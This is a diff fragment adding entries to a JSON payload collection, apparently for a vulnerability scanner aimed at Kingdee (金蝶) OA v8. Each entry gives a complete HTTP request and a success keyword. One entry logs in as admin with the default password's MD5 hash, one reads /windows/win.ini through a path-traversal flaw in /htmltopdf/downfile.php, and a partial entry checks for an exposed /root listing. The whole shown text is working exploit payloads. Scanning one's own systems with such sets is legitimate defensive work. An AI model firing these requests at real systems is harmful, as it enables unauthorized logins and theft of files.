+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}"
+    },
+    "金蝶OA-v8-default-password": {
+      "description": "金蝶OA-v8-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/inter/ajax.php?cmd=get_user_login_cmd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "{\"get_user_login_cmd\":{\"name\":\"admin\",\"password\":\"21232f297a57a5a743894a0e4a801fc3\"}}"
+      },
+      "location": "body",
+      "keywords": "ADMIN"
+    },
+    "金蝶OA-v8-v8-file-read": {
+      "description": "金蝶OA-v8-v8-file-read",
+      "payload": {
+        "method": "GET",
+        "uri": "/htmltopdf/downfile.php?filename=/windows/win.ini",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
     }
   }
 }
